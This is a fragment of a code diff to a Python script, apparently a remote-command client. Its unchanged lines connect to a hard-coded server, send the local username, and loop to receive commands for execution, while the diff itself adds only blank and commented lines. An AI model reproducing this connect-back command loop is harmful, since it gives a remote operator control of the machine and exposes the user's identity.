@@ -24,6 +24,8 @@ from functions import *
 import signal
 import struct
 
+
+
 #Server
 port = 8080
 host = "192.168.0.14"
@@ -50,6 +52,8 @@ s.send(getpass.getuser().encode())
 
 
 while True:
+    #hi = s.recv(1024).decode()
+    #print(hi)
     command = s.recv(1024)
     command = command.decode()
     check_command(s,command)
